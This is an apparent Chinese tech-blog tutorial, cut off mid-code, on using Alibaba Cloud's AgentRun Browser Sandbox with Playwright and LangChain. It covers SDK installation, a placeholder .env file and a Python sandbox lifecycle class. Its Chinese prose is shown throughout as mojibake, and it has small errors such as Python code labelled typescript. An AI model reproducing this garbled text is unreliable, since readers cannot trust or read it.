p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>åœ¨ Agentic AI æ—¶ä»£,æ™ºèƒ½ä½“éœ€è¦ä¸çœŸå®ä¸–ç•Œäº¤äº’,è€Œæµè§ˆå™¨æ˜¯è¿æ¥è™šæ‹Ÿä¸–ç•Œä¸ç°å®ä¸–ç•Œçš„é‡è¦æ¡¥æ¢ã€‚AgentRun Browser Sandbox ä¸ºæ™ºèƒ½ä½“æä¾›äº†å®‰å…¨ã€é«˜æ€§èƒ½ã€å…è¿ç»´çš„æµè§ˆå™¨æ‰§è¡Œç¯å¢ƒ,è®© AI Agent çœŸæ­£å…·å¤‡"ä¸Šç½‘"çš„èƒ½åŠ›â€”â€”ä»ç½‘é¡µæŠ“å–ã€ä¿¡æ¯æå–åˆ°è¡¨å•å¡«å†™ã€è‡ªåŠ¨åŒ–æ“ä½œ,ä¸€åˆ‡çš†å¯å®ç°ã€‚</p>
<h2 data-id="heading-1">AgentRun Browser Sandbox ä»‹ç»</h2>
<h3 data-id="heading-2">ä»€ä¹ˆæ˜¯ Browser Sandbox?</h3>
<p>Browser Sandbox æ˜¯ AgentRun å¹³å°æä¾›çš„äº‘åŸç”Ÿæ— å¤´æµè§ˆå™¨æ²™ç®±æœåŠ¡,åŸºäºé˜¿é‡Œäº‘å‡½æ•°è®¡ç®—ï¼ˆFCï¼‰æ„å»ºã€‚å®ƒä¸ºæ™ºèƒ½ä½“æä¾›äº†ä¸€ä¸ªå®‰å…¨éš”ç¦»çš„æµè§ˆå™¨æ‰§è¡Œç¯å¢ƒ,æ”¯æŒé€šè¿‡æ ‡å‡†çš„ Chrome DevTools Protocol (CDP) è¿œç¨‹æ§åˆ¶æµè§ˆå™¨å®ä¾‹ã€‚</p>
<h3 data-id="heading-3">æ ¸å¿ƒç‰¹æ€§</h3>
<p><strong>æ— å¤´æµè§ˆå™¨èƒ½åŠ›</strong></p>
<ul>
<li>å†…ç½® Chromium/Chrome æµè§ˆå™¨,æ”¯æŒå®Œæ•´çš„ Web æ ‡å‡†</li>
<li>åŸç”Ÿå…¼å®¹ Puppeteerã€Playwright ç­‰ä¸»æµè‡ªåŠ¨åŒ–æ¡†æ¶</li>
<li>æ”¯æŒé€šè¿‡ CDP åè®®è¿›è¡Œç²¾ç»†åŒ–æ§åˆ¶</li>
</ul>
<p><strong>å®æ—¶å¯è§†åŒ–</strong></p>
<ul>
<li>å†…ç½® VNC æœåŠ¡,æ”¯æŒå®æ—¶æŸ¥çœ‹æµè§ˆå™¨ç•Œé¢</li>
<li>æä¾›æ“ä½œå½•åˆ¶åŠŸèƒ½,æ–¹ä¾¿è°ƒè¯•å’Œå›æ”¾</li>
<li>æ”¯æŒé€šè¿‡ noVNC å®¢æˆ·ç«¯åœ¨ç½‘é¡µä¸­ç›´æ¥è§‚çœ‹</li>
</ul>
<p><strong>å®‰å…¨ä¸éš”ç¦»</strong></p>
<ul>
<li>æ¯ä¸ªæ²™ç®±å®ä¾‹è¿è¡Œåœ¨ç‹¬ç«‹çš„å®¹å™¨ç¯å¢ƒä¸­</li>
<li>æ–‡ä»¶ç³»ç»Ÿå’Œè¿›ç¨‹ç©ºé—´å®Œå…¨éš”ç¦»</li>
<li>æ”¯æŒ WSS åŠ å¯†ä¼ è¾“,ç¡®ä¿æ•°æ®å®‰å…¨</li>
</ul>
<p><strong>Serverless æ¶æ„</strong></p>
<ul>
<li>æŒ‰éœ€åˆ›å»º,æŒ‰é‡ä»˜è´¹,æ— éœ€æå‰é¢„ç½®èµ„æº</li>
<li>å¿«é€Ÿå¼¹æ€§ä¼¸ç¼©,æ”¯æŒé«˜å¹¶å‘åœºæ™¯</li>
<li>é›¶è¿ç»´,æ— éœ€ç®¡ç†æœåŠ¡å™¨å’Œæµè§ˆå™¨ä¾èµ–</li>
</ul>
<h3 data-id="heading-4">ä¸»è¦åº”ç”¨åœºæ™¯</h3>
<ul>
<li><strong>AI Agent èµ‹èƒ½</strong>: ä¸ºå¤§æ¨¡å‹æä¾›"çœ¼ç›"å’Œ"æ‰‹",æ‰§è¡Œç½‘é¡µæµè§ˆã€ä¿¡æ¯æå–ã€åœ¨çº¿æ“ä½œç­‰ä»»åŠ¡</li>
<li><strong>è‡ªåŠ¨åŒ–æµ‹è¯•</strong>: åœ¨äº‘ç«¯è¿è¡Œç«¯åˆ°ç«¯ï¼ˆE2Eï¼‰æµ‹è¯•å’Œè§†è§‰å›å½’æµ‹è¯•</li>
<li><strong>æ•°æ®é‡‡é›†</strong>: ç¨³å®šã€é«˜æ•ˆåœ°è¿›è¡Œç½‘é¡µæŠ“å–,åº”å¯¹åŠ¨æ€åŠ è½½å’Œåçˆ¬è™«æŒ‘æˆ˜</li>
<li><strong>å†…å®¹ç”Ÿæˆ</strong>: è‡ªåŠ¨åŒ–ç”Ÿæˆç½‘é¡µæˆªå›¾æˆ– PDF æ–‡æ¡£</li>
</ul>
<h2 data-id="heading-5">ä¸Šæ‰‹ä½¿ç”¨ Agentrun Browser Sandbox</h2>
<h3 data-id="heading-6">AgentRun SDK å¿«é€Ÿä»‹ç»</h3>
<blockquote>
<p>åç»­çš„å†…å®¹å°†åŸºäº Agentrun SDK è¿›è¡Œï¼Œå› æ­¤æˆ‘ä»¬å…ˆå¯¹ SDK è¿›è¡Œç®€è¦ä»‹ç»</p>
</blockquote>
<p>AgentRun SDK æ˜¯ä¸€ä¸ªå¼€æºçš„ Python å·¥å…·åŒ…,æ—¨åœ¨ç®€åŒ–æ™ºèƒ½ä½“ä¸ AgentRun å¹³å°å„ç§æœåŠ¡ï¼ˆåŒ…æ‹¬ Browser Sandboxï¼‰çš„é›†æˆã€‚å®ƒæä¾›äº†ç»Ÿä¸€çš„æ¥å£,è®©æ‚¨å¯ä»¥ç”¨å‡ è¡Œä»£ç å°±å°†æ²™ç®±èƒ½åŠ›é›†æˆåˆ°ç°æœ‰çš„ Agent æ¡†æ¶ä¸­ã€‚SDK çš„æ ¸å¿ƒåŠŸèƒ½å¦‚ä¸‹ï¼š</p>
<p><strong>ç»Ÿä¸€é›†æˆæ¥å£</strong></p>
<ul>
<li>æä¾›å¯¹ LangChainã€AgentScope ç­‰ä¸»æµæ¡†æ¶çš„å¼€ç®±å³ç”¨æ”¯æŒ</li>
<li>ç»Ÿä¸€çš„æ¨¡å‹ä»£ç†æ¥å£,ç®€åŒ–å¤šæ¨¡å‹ç®¡ç†</li>
<li>æ ‡å‡†åŒ–çš„å·¥å…·æ³¨å†Œæœºåˆ¶</li>
</ul>
<p><strong>Sandbox ç”Ÿå‘½å‘¨æœŸç®¡ç†</strong></p>
<ul>
<li>è‡ªåŠ¨åˆ›å»ºå’Œé”€æ¯æ²™ç®±å®ä¾‹</li>
<li>æ”¯æŒä¼šè¯çº§åˆ«çš„çŠ¶æ€ä¿æŒ</li>
<li>çµæ´»çš„èµ„æºé…ç½®å’Œè¶…æ—¶æ§åˆ¶</li>
</ul>
<h4 data-id="heading-7">å®‰è£… AgentRun SDK</h4>
<pre><code class="hljs language-bash" lang="bash">pip install agentrun-sdk[playwright,server]
</code></pre>
<blockquote>
<p><strong>æ³¨æ„</strong>: ç¡®ä¿æ‚¨çš„ Python ç¯å¢ƒç‰ˆæœ¬åœ¨ 3.10 åŠä»¥ä¸Šã€‚</p>
</blockquote>
<h4 data-id="heading-8">åŸºæœ¬ä½¿ç”¨ç¤ºä¾‹</h4>
<p>ä»¥ä¸‹æ˜¯ä½¿ç”¨ AgentRun SDK åˆ›å»ºå’Œç®¡ç† Browser Sandbox çš„æ ¸å¿ƒä»£ç ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> agentrun.sandbox <span class="hljs-keyword">import</span> Sandbox, TemplateType
<span class="hljs-keyword">from</span> playwright.sync_api <span class="hljs-keyword">import</span> sync_playwright

<span class="hljs-comment"># åˆ›å»º Browser Sandbox</span>
sandbox = Sandbox.create(
    template_type=TemplateType.BROWSER,
    template_name=<span class="hljs-string">"your-template-name"</span>,
    sandbox_idle_timeout_seconds=<span class="hljs-number">300</span>
)

<span class="hljs-comment"># è·å– CDP URLï¼ˆç”¨äº Playwright è¿æ¥ï¼‰</span>
cdp_url = sandbox.get_cdp_url()

<span class="hljs-comment"># ä½¿ç”¨ Playwright è¿æ¥å¹¶æ“ä½œ</span>
<span class="hljs-keyword">with</span> sync_playwright() <span class="hljs-keyword">as</span> p:
    browser = p.chromium.connect_over_cdp(cdp_url)
    page = browser.contexts[<span class="hljs-number">0</span>].pages[<span class="hljs-number">0</span>]
    
    page.goto(<span class="hljs-string">"https://www.example.com"</span>)
    page.screenshot(path=<span class="hljs-string">"screenshot.png"</span>)
    
    browser.close()

<span class="hljs-comment"># é”€æ¯ Sandbox</span>
sandbox.delete()
</code></pre>
<p><strong>å…³é”®æ¦‚å¿µï¼š</strong></p>
<ul>
<li><strong>template_name</strong>: æ§åˆ¶å°åˆ›å»ºçš„æµè§ˆå™¨ç¯å¢ƒæ¨¡æ¿</li>
<li><strong>cdp_url</strong>: ç”¨äº Playwright/Puppeteer è¿æ¥</li>
<li><strong>vnc_url</strong>: ç”¨äºå®æ—¶æŸ¥çœ‹æµè§ˆå™¨ç”»é¢ï¼ˆå¯é€šè¿‡ <code>sandbox.get_cdp_url()</code> è·å–ï¼‰</li>
</ul>
<blockquote>
<p><strong>æ³¨æ„</strong>: ç”±äºæ‰€æœ‰æµè§ˆå™¨æ“ä½œéƒ½åœ¨äº‘ç«¯è¿›è¡Œï¼Œæ‚¨æ— éœ€åœ¨æœ¬åœ°å®‰è£…æµè§ˆå™¨ã€‚Playwright ä»…ç”¨äºé€šè¿‡ CDP åè®®è¿æ¥åˆ°äº‘ç«¯çš„æµè§ˆå™¨å®ä¾‹ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-9">å¦‚ä½•åˆ›å»º sandbox æ¨¡æ¿</h3>
<p>ä½¿ç”¨ Browser Sandbox éœ€è¦æ–°å»º Sandbox æ¨¡æ¿ï¼Œæ‚¨éœ€è¦è®¿é—®  <a href="https://link.juejin.cn?target=https%3A%2F%2Ffunctionai.console.aliyun.com%2Fcn-hangzhou%2Fagent%2Fruntime%2Fsandbox" target="_blank" title="https://functionai.console.aliyun.com/cn-hangzhou/agent/runtime/sandbox" ref="nofollow noopener noreferrer">Agentrun æ§åˆ¶å°ç½‘ç«™</a>ï¼Œå¹¶æŒ‰ç…§å¦‚ä¸‹æ­¥éª¤åˆ›å»ºæ¨¡æ¿:</p>
<ol>
<li>åœ¨é¡¶éƒ¨èœå•æ é€‰æ‹©â€œè¿è¡Œæ—¶ä¸æ²™ç®±â€ï¼›</li>
<li>åœ¨å·¦ä¾§è¾¹æ é€‰æ‹©â€œSandboxæ²™ç®±â€ï¼›</li>
<li>ç‚¹å‡»å³ä¸Šè§’â€œåˆ›å»ºæ²™ç®±æ¨¡æ¿â€ï¼›</li>
</ol>
<p><img src="https://intranetproxy.alipay.com/skylark/lark/0/2025/png/217148/1766974429440-0c1449b8-6b97-42a0-b7c1-ce0b7a9a6dfd.png" alt="" loading="lazy"/></p>
<ol start="4">
<li>é€‰æ‹©â€œæµè§ˆå™¨â€ï¼›
<img src="https://intranetproxy.alipay.com/skylark/lark/0/2025/png/217148/1766974441761-64413df3-58a5-4404-b1dc-56d294d739eb.png" alt="" loading="lazy"/></li>
<li>åœ¨å¼¹å‡ºçš„æŠ½å±‰å¯¹è¯æ¡†ä¸­å¡«å†™å’Œé€‰æ‹©æ‚¨çš„æ¨¡æ¿çš„è§„æ ¼ã€ç½‘ç»œç­‰é…ç½®ï¼Œå¹¶å¤åˆ¶æ¨¡æ¿åç§°ï¼›</li>
</ol>
<p><img src="https://intranetproxy.alipay.com/skylark/lark/0/2025/png/217148/1766974447184-8384c578-4705-4757-9d82-7b785d8038fb.png" alt="" loading="lazy"/>
6. ç‚¹å‡»â€œåˆ›å»ºæµè§ˆå™¨â€ ç­‰å¾…å…¶å°±ç»ªå³å¯ã€‚</p>
<h3 data-id="heading-10">ä»é›¶å¼€å§‹ç”¨ LangChain åˆ›å»º Browser Sandbox æ™ºèƒ½ä½“</h3>
<p>æœ¬æ•™ç¨‹å°†æŒ‡å¯¼æ‚¨ä»é›¶å¼€å§‹åˆ›å»ºä¸€ä¸ªå®Œæ•´çš„ Browser Sandbox æ™ºèƒ½ä½“é¡¹ç›®ã€‚</p>
<h4 data-id="heading-11">åŸºäº LangChain é›†æˆ Browser Sandbox</h4>
<p>æœ¬æ•™ç¨‹å°†è¯¦ç»†è®²è§£å¦‚ä½•ä½¿ç”¨ LangChain åˆ›å»º Browser Sandbox ç›¸å…³çš„ tools å¹¶é›†æˆåˆ° Agent ä¸­ã€‚</p>
<h5 data-id="heading-12">é¡¹ç›®ç»“æ„</h5>
<p>ä¸ºäº†ä¿æŒä»£ç çš„å†…èšæ€§å’Œå¯ç»´æŠ¤æ€§ï¼Œæˆ‘ä»¬å°†ä»£ç æ‹†åˆ†ä¸ºä»¥ä¸‹æ¨¡å—ï¼š</p>
<p><strong>æ¨¡å—èŒè´£åˆ’åˆ†ï¼š</strong></p>
<ul>
<li>sandbox_manager.py: è´Ÿè´£ Sandbox çš„åˆ›å»ºã€ç®¡ç†å’Œé”€æ¯ï¼Œæä¾›ç»Ÿä¸€çš„æ¥å£</li>
<li>langchain_agent.py: è´Ÿè´£åˆ›å»º LangChain tools å’Œ Agentï¼Œé›†æˆ VNC ä¿¡æ¯</li>
<li>main.py: ä½œä¸ºå…¥å£æ–‡ä»¶ï¼Œæ¼”ç¤ºå¦‚ä½•ä½¿ç”¨ä¸Šè¿°æ¨¡å—</li>
</ul>
<h5 data-id="heading-13">æ­¥éª¤ 1: åˆ›å»ºé¡¹ç›®å¹¶å®‰è£…ä¾èµ–</h5>
<p>é¦–å…ˆåˆ›å»ºé¡¹ç›®ç›®å½•ï¼ˆå¦‚æœè¿˜æ²¡æœ‰ï¼‰ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript">mkdir -p langchain-demo
cd langchain-demo
</code></pre>
<p>åˆ›å»º requirements.txt æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"># <span class="hljs-title class_">LangChain</span> æ ¸å¿ƒåº“
langchain&gt;=<span class="hljs-number">0.1</span><span class="hljs-number">.0</span>
langchain-openai&gt;=<span class="hljs-number">0.0</span><span class="hljs-number">.5</span>
langchain-community&gt;=<span class="hljs-number">0.0</span><span class="hljs-number">.20</span>

# <span class="hljs-title class_">AgentRun</span> <span class="hljs-variable constant_">SDK</span>
agentrun-sdk[playwright,server]&gt;=<span class="hljs-number">0.0</span><span class="hljs-number">.8</span>

# æµè§ˆå™¨è‡ªåŠ¨åŒ–
playwright&gt;=<span class="hljs-number">1.40</span><span class="hljs-number">.0</span>

# ç¯å¢ƒå˜é‡ç®¡ç†
python-dotenv&gt;=<span class="hljs-number">1.0</span><span class="hljs-number">.0</span>
</code></pre>
<p>ç„¶åå®‰è£…ä¾èµ–ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript">pip install -r requirements.<span class="hljs-property">txt</span>
</code></pre>
<p>ä¸»è¦ä¾èµ–è¯´æ˜ï¼š</p>
<ul>
<li>langchain å’Œ langchain-openai: LangChain æ ¸å¿ƒåº“</li>
<li>agentrun-sdk[playwright,server]: AgentRun SDKï¼Œç”¨äº Sandbox ç®¡ç†</li>
<li>playwright: æµè§ˆå™¨è‡ªåŠ¨åŒ–åº“ python-dotenv: ç¯å¢ƒå˜é‡ç®¡ç†</li>
</ul>
<h5 data-id="heading-14">æ­¥éª¤ 2: é…ç½®ç¯å¢ƒå˜é‡</h5>
<p>åœ¨é¡¹ç›®æ ¹ç›®å½•åˆ›å»º .env æ–‡ä»¶ï¼Œé…ç½®ä»¥ä¸‹ç¯å¢ƒå˜é‡ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"># é˜¿é‡Œäº‘ç™¾ç‚¼å¹³å°çš„ <span class="hljs-variable constant_">API</span> <span class="hljs-title class_">Key</span>ï¼Œç”¨äºè°ƒç”¨å¤§æ¨¡å‹èƒ½åŠ›
# è¯·å‰å¾€ <span class="hljs-attr">https</span>:<span class="hljs-comment">//bailian.console.aliyun.com/?tab=app#/api-key åˆ›å»ºå’ŒæŸ¥çœ‹</span>
<span class="hljs-variable constant_">DASHSCOPE_API_KEY</span>=sk-your-bailian-api-key

# é˜¿é‡Œäº‘è´¦å·çš„è®¿é—®å¯†é’¥ <span class="hljs-variable constant_">ID</span> å’Œè®¿é—®å¯†é’¥ <span class="hljs-title class_">Secret</span>ï¼Œç”¨äº <span class="hljs-title class_">AgentRun</span> <span class="hljs-variable constant_">SDK</span> é‰´æƒ
<span class="hljs-variable constant_">ALIBABA_CLOUD_ACCESS_KEY_ID</span>=your-ak
<span class="hljs-variable constant_">ALIBABA_CLOUD_ACCESS_KEY_SECRET</span>=your-sk
<span class="hljs-variable constant_">ALIBABA_CLOUD_ACCOUNT_ID</span>=your-main-account-id
<span class="hljs-variable constant_">ALIBABA_CLOUD_REGION</span>=cn-hangzhou

# browser sandbox æ¨¡æ¿çš„åç§°ï¼Œå¯ä»¥åœ¨ <span class="hljs-attr">https</span>:<span class="hljs-comment">//functionai.console.aliyun.com/cn-hangzhou/agent/runtime/sandbox æ§åˆ¶å°åˆ›å»º</span>
<span class="hljs-variable constant_">BROWSER_TEMPLATE_NAME</span>=sandbox-your-template-name

# agentrun çš„æ§åˆ¶é¢å’Œæ•°æ®é¢çš„ <span class="hljs-variable constant_">API</span> ç«¯ç‚¹è¯·æ±‚åœ°å€ï¼Œé»˜è®¤cn-hangzhou
<span class="hljs-variable constant_">AGENTRUN_CONTROL_ENDPOINT</span>=agentrun.<span class="hljs-property">cn</span>-hangzhou.<span class="hljs-property">aliyuncs</span>.<span class="hljs-property">com</span>
<span class="hljs-variable constant_">AGENTRUN_DATA_ENDPOINT</span>=<span class="hljs-attr">https</span>:<span class="hljs-comment">//${your-main-account-id}.agentrun-data.cn-hangzhou.aliyuncs.com</span>
</code></pre>
<h5 data-id="heading-15">æ­¥éª¤ 3: åˆ›å»º Sandbox ç”Ÿå‘½å‘¨æœŸç®¡ç†æ¨¡å—</h5>
<p>åˆ›å»º sandbox_manager.py æ–‡ä»¶ï¼Œè´Ÿè´£ Sandbox çš„åˆ›å»ºã€ç®¡ç†å’Œé”€æ¯ã€‚æ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-string">""</span><span class="hljs-string">"
Sandbox ç”Ÿå‘½å‘¨æœŸç®¡ç†æ¨¡å—

è´Ÿè´£ AgentRun Browser Sandbox çš„åˆ›å»ºã€ç®¡ç†å’Œé”€æ¯ã€‚
æä¾›ç»Ÿä¸€çš„æ¥å£ä¾› LangChain Agent ä½¿ç”¨ã€‚
"</span><span class="hljs-string">""</span>

<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-title class_">Optional</span>, <span class="hljs-title class_">Dict</span>, <span class="hljs-title class_">Any</span>
<span class="hljs-keyword">from</span> dotenv <span class="hljs-keyword">import</span> load_dotenv

# åŠ è½½ç¯å¢ƒå˜é‡
<span class="hljs-title function_">load_dotenv</span>()


<span class="hljs-keyword">class</span> <span class="hljs-title class_">SandboxManager</span>:
    <span class="hljs-string">""</span><span class="hljs-string">"Sandbox ç”Ÿå‘½å‘¨æœŸç®¡ç†å™¨"</span><span class="hljs-string">""</span>
    
    def <span class="hljs-title function_">__init__</span>(self):
        self.<span class="hljs-property">_sandbox</span>: <span class="hljs-title class_">Optional</span>[<span class="hljs-title class_">Any</span>] = <span class="hljs-title class_">None</span>
        self.<span class="hljs-property">_sandbox_id</span>: <span class="hljs-title class_">Optional</span>[str] = <span class="hljs-title class_">None</span>
        self.<span class="hljs-property">_cdp_url</span>: <span class="hljs-title class_">Optional</span>[str] = <span class="hljs-title class_">None</span>
        self.<span class="hljs-property">_vnc_url</span>: <span class="hljs-title class_">Optional</span>[str] = <span class="hljs-title class_">None</span>
    
    def <span class="hljs-title function_">create</span>(
        self,
        <span class="hljs-attr">template_name</span>: <span class="hljs-title class_">Optional</span>[str] = <span class="hljs-title class_">None</span>,
        <span class="hljs-attr">idle_timeout</span>: int = <span class="hljs-number">3000</span>
    ) -&gt; <span class="hljs-title class_">Dict</span>[str, <span class="hljs-title class_">Any</span>]:
        <span class="hljs-string">""</span><span class="hljs-string">"
        åˆ›å»ºæˆ–è·å–ä¸€ä¸ªæµè§ˆå™¨ sandbox å®ä¾‹
        
        Args:
            template_name: Sandbox æ¨¡æ¿åç§°ï¼Œå¦‚æœä¸º None åˆ™ä»ç¯å¢ƒå˜é‡è¯»å–
            idle_timeout: ç©ºé—²è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰ï¼Œé»˜è®¤ 3000 ç§’
        
        Returns:
            dict: åŒ…å« sandbox_id, cdp_url, vnc_url çš„å­—å…¸
        
        Raises:
            RuntimeError: åˆ›å»ºå¤±è´¥æ—¶æŠ›å‡ºå¼‚å¸¸
        "</span><span class="hljs-string">""</span>
        <span class="hljs-attr">try</span>:
            <span class="hljs-keyword">from</span> agentrun.<span class="hljs-property">sandbox</span> <span class="hljs-keyword">import</span> <span class="hljs-title class_">Sandbox</span>, <span class="hljs-title class_">TemplateType</span>
            
            # å¦‚æœå·²æœ‰ sandboxï¼Œç›´æ¥è¿”å›
            <span class="hljs-keyword">if</span> self.<span class="hljs-property">_sandbox</span> is not <span class="hljs-title class_">None</span>:
                <span class="hljs-keyword">return</span> self.<span class="hljs-title function_">get_info</span>()
            
            # ä»ç¯å¢ƒå˜é‡è·å–æ¨¡æ¿åç§°
            <span class="hljs-keyword">if</span> template_name is <span class="hljs-title class_">None</span>:
                template_name = os.<span class="hljs-title function_">getenv</span>(
                    <span class="hljs-string">"BROWSER_TEMPLATE_NAME"</span>,
                    <span class="hljs-string">"sandbox-browser-demo"</span>
                )
            
            # åˆ›å»º sandbox
            self.<span class="hljs-property">_sandbox</span> = <span class="hljs-title class_">Sandbox</span>.<span class="hljs-title function_">create</span>(
                template_type=<span class="hljs-title class_">TemplateType</span>.<span class="hljs-property">BROWSER</span>,
                template_name=template_name,
                sandbox_idle_timeout_seconds=idle_timeout
            )
            
            self.<span class="hljs-property">_sandbox_id</span> = self.<span class="hljs-property">_sandbox</span>.<span class="hljs-property">sandbox_id</span>
            self.<span class="hljs-property">_cdp_url</span> = self.<span class="hljs-title function_">_get_cdp_url</span>()
            self.<span class="hljs-property">_vnc_url</span> = self.<span class="hljs-title function_">_get_vnc_url</span>()
            
            <span class="hljs-keyword">return</span> self.<span class="hljs-title function_">get_info</span>()
        
        except <span class="hljs-title class_">ImportError</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
            <span class="hljs-title function_">print</span>(e)
            raise <span class="hljs-title class_">RuntimeError</span>(
                <span class="hljs-string">"agentrun-sdk æœªå®‰è£…ï¼Œè¯·è¿è¡Œ: pip install agentrun-sdk[playwright,server]"</span>
            )
        except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
            raise <span class="hljs-title class_">RuntimeError</span>(f<span class="hljs-string">"åˆ›å»º Sandbox å¤±è´¥: {str(e)}"</span>)
    
    def <span class="hljs-title function_">get_info</span>(self) -&gt; <span class="hljs-title class_">Dict</span>[str, <span class="hljs-title class_">Any</span>]:
        <span class="hljs-string">""</span><span class="hljs-string">"
        è·å–å½“å‰ sandbox çš„ä¿¡æ¯
        
        Returns:
            dict: åŒ…å« sandbox_id, cdp_url, vnc_url çš„å­—å…¸
        
        Raises:
            RuntimeError: å¦‚æœæ²¡æœ‰æ´»åŠ¨çš„ sandbox
        "</span><span class="hljs-string">""</span>
        <span class="hljs-keyword">if</span> self.<span class="hljs-property">_sandbox</span> is <span class="hljs-title class_">None</span>:
            raise <span class="hljs-title class_">RuntimeError</span>(<span class="hljs-string">"æ²¡æœ‰æ´»åŠ¨çš„ sandboxï¼Œè¯·å…ˆåˆ›å»º"</span>)
        
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">"sandbox_id"</span>: self.<span class="hljs-property">_sandbox_id</span>,
            <span class="hljs-string">"cdp_url"</span>: self.<span class="hljs-property">_cdp_url</span>,
            <span class="hljs-string">"vnc_url"</span>: self.<span class="hljs-property">_vnc_url</span>,
        }
    
    def <span class="hljs-title function_">get_cdp_url</span>(self) -&gt; <span class="hljs-title class_">Optional</span>[str]:
        <span class="hljs-string">""</span><span class="hljs-string">"è·å– CDP URL"</span><span class="hljs-string">""</span>
        <span class="hljs-keyword">return</span> self.<span class="hljs-property">_sandbox</span>.<span class="hljs-title function_">get_cdp_url</span>()
    
    def <span class="hljs-title function_">get_vnc_url</span>(self) -&gt; <span class="hljs-title class_">Optional</span>[str]:
        <span class="hljs-string">""</span><span class="hljs-string">"è·å– VNC URL"</span><span class="hljs-string">""</span>
        <span class="hljs-keyword">return</span> self.<span class="hljs-property">_sandbox</span>.<span class="hljs-title function_">get_vnc_url</span>()
    
    def <span class="hljs-title function_">get_sandbox_id</span>(self) -&gt; <span class="hljs-title class_">Optional</span>[str]:
        <span class="hljs-string">""</span><span class="hljs-string">"è·å– Sandbox ID"</span><span class="hljs-string">""</span>
        <span class="hljs-keyword">return</span> self.<span class="hljs-property">_sandbox_id</span>
    
    def <span class="hljs-title function_">destroy</span>(self) -&gt; <span class="hljs-attr">str</span>:
        <span class="hljs-string">""</span><span class="hljs-string">"
        é”€æ¯å½“å‰çš„ sandbox å®ä¾‹
        
        Returns:
            str: æ“ä½œç»“æœæè¿°
        "</span><span class="hljs-string">""</span>
        <span class="hljs-keyword">if</span> self.<span class="hljs-property">_sandbox</span> is <span class="hljs-title class_">None</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">"æ²¡æœ‰æ´»åŠ¨çš„ sandbox"</span>
        
        <span class="hljs-attr">try</span>:
            sandbox_id = self.<span class="hljs-property">_sandbox_id</span>
            
            # å°è¯•é”€æ¯ sandbox
            <span class="hljs-keyword">if</span> <span class="hljs-title function_">hasattr</span>(self.<span class="hljs-property">_sandbox</span>, <span class="hljs-string">'delete'</span>):
                self.<span class="hljs-property">_sandbox</span>.<span class="hljs-title function_">delete</span>()
            elif <span class="hljs-title function_">hasattr</span>(self.<span class="hljs-property">_sandbox</span>, <span class="hljs-string">'stop'</span>):
                self.<span class="hljs-property">_sandbox</span>.<span class="hljs-title function_">stop</span>()
            elif <span class="hljs-title function_">hasattr</span>(self.<span class="hljs-property">_sandbox</span>, <span class="hljs-string">'destroy'</span>):
                self.<span class="hljs-property">_sandbox</span>.<span class="hljs-title function_">destroy</span>()
            
